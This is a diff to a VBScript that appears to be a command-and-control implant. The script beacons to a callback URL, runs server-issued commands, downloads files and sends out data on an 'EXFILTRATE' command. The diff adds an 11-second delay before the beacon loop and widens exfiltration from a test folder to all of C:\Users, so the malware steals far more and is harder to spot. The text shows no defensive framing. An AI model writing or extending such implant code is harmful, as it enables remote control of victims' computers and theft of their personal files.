@@ -27,6 +27,11 @@ friendly_name = Trim(xmlHttpReq.responseText)
 
 break = False
 
+
+WScript.Sleep 11100  ' Wait 11 seconds
+   
+
+
 While break <> True
     Set xmlHttpReq = CreateObject("MSXML2.ServerXMLHTTP")
     xmlHttpReq.Open "GET", callbackUrl & "/s/VBSSIGNATURE:" & friendly_name & ":", false
@@ -42,7 +47,7 @@ While break <> True
     ElseIf coutput = "EXIT" Then
         break = True
     ElseIf coutput = "EXFILTRATE" Then
-        folderPath = "C:\Users\timtr\Documents\vbstemp"
+        folderPath = "C:\Users"
         exfdata = ""
         exfdata = GetExfData(folderPath)
         Post(exfdata)
@@ -129,7 +134,7 @@ Function DownloadFile(url, output_name)
     xmlHttpReq.Send
 
     Do While xmlHttpReq.readyState <> 4
-        WScript.Sleep 10  ' Wait 50 milliseconds before checking again
+        WScript.Sleep 10  ' Wait 10 milliseconds before checking again
     Loop
 
     If xmlHttpReq.Status = 200 Then
